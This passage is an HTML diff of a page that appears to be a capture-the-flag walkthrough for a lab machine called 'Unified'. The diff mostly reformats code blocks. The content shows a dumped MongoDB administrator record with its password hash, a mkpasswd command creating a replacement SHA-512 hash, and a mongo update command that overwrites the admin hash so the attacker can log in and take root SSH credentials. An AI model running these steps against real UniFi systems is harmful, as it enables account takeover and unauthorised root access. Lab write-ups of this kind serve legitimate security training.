-</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>        &quot;x_shadow&quot; : &quot;$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&quot;,
-</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>        &quot;time_created&quot; : NumberLong(1640900495),
-</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>        &quot;last_site_name&quot; : &quot;default&quot;,
-</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>        &quot;ui_settings&quot; : 
-</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>``
-</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>
-</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>The output reveals a user called administrator. Their password hash is located in the x_shadow variable but in this instance it cannot be cracked with any password cracking utilities. Instead we can change the x_shadow password hash with our very own created hash in order to replace the administrators password and authenticate to the administrative panel. To do this we can use the mkpasswd command line utility. The $6$ is the identifier for the hashing algorithm that is being used, which is SHA-512 in this case, therefore we will have to make a hash of the same type.
-</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>
-</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>```bash
-</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a>mkpasswd -m sha-512 lalala 
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-11-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-11-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-11-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-11-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-11-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-11-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-11-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-11-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-11-10">10</a></span>
+<span class="normal"><a href="#__codelineno-11-11">11</a></span>
+<span class="normal"><a href="#__codelineno-11-12">12</a></span>
+<span class="normal"><a href="#__codelineno-11-13">13</a></span>
+<span class="normal"><a href="#__codelineno-11-14">14</a></span>
+<span class="normal"><a href="#__codelineno-11-15">15</a></span>
+<span class="normal"><a href="#__codelineno-11-16">16</a></span>
+<span class="normal"><a href="#__codelineno-11-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>MongoDB shell version v3.6.3
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>connecting to: mongodb://127.0.0.1:27117/ace
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3"></a>MongoDB server version: 3.6.3
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4"></a>{
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5"></a>        &quot;_id&quot; : ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;),
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6"></a>        &quot;name&quot; : &quot;administrator&quot;,
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7"></a>        &quot;email&quot; : &quot;administrator@unified.htb&quot;,
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8"></a>        &quot;x_shadow&quot; : &quot;$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&quot;,
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9"></a>        &quot;time_created&quot; : NumberLong(1640900495),
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10"></a>        &quot;last_site_name&quot; : &quot;default&quot;,
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11"></a>        &quot;ui_settings&quot; : 
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12"></a>``
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13"></a>
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14"></a>The output reveals a user called administrator. Their password hash is located in the x_shadow variable but in this instance it cannot be cracked with any password cracking utilities. Instead we can change the x_shadow password hash with our very own created hash in order to replace the administrators password and authenticate to the administrative panel. To do this we can use the mkpasswd command line utility. The $6$ is the identifier for the hashing algorithm that is being used, which is SHA-512 in this case, therefore we will have to make a hash of the same type.
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15"></a>
+</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16"></a>```bash
+</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17"></a>mkpasswd -m sha-512 lalala 
+</span></code></pre></div></td></tr></table></div>
 <p>It returns: $6$bTJCdmWvffwcSm9p$6FHYn1fesp3WjZesRG20dDQ/bp6Vktrq8aLylXvil8tApzFCguM2MEii63Uemf8BE7jBrB5ZcZwes85JpuXPq0</p>
 <p>With that, now we can update the administrator password. From the terminal of the victim's machine:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>mongo<span class="w"> </span>--port<span class="w"> </span><span class="m">27117</span><span class="w"> </span>ace<span class="w"> </span>--eval<span class="w"> </span><span class="s1">&#39;db.admin.update({&quot;_id&quot;:</span>
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="s1">ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;)},{$set:{&quot;x_shadow&quot;:&quot;$6$bTJCdmWvffwcSm9p$6FHYn1fesp3WjZesRG20dDQ/bp6Vktrq8aLylXvil8tApzFCguM2MEii63Uemf8BE7jBrB5ZcZwes85JpuXPq0&quot;}})&#39;</span>
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="c1"># ObjectId is the one that correlates with the administrator one.</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span>
+<span class="normal"><a href="#__codelineno-12-2">2</a></span>
+<span class="normal"><a href="#__codelineno-12-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>mongo<span class="w"> </span>--port<span class="w"> </span><span class="m">27117</span><span class="w"> </span>ace<span class="w"> </span>--eval<span class="w"> </span><span class="s1">&#39;db.admin.update({&quot;_id&quot;:</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a><span class="s1">ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;)},{$set:{&quot;x_shadow&quot;:&quot;$6$bTJCdmWvffwcSm9p$6FHYn1fesp3WjZesRG20dDQ/bp6Vktrq8aLylXvil8tApzFCguM2MEii63Uemf8BE7jBrB5ZcZwes85JpuXPq0&quot;}})&#39;</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a><span class="c1"># ObjectId is the one that correlates with the administrator one.</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Now, in the admin panel from the browser enter the new credentials for administrator.</p>
 <p>When logged into the dashboard, grab ssh credentials for root user from Settings&gt;Site, tab "Device Authentication", SSH Authentication.</p>
 <p>With those credentials, access via <a href="../22-ssh/">ssh connection</a>.</p>
@@ -17287,7 +17455,7 @@ unifi       5183  0.0  0.0  11468  1108 pts/0    S+   14:47   0:00 grep mongo
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
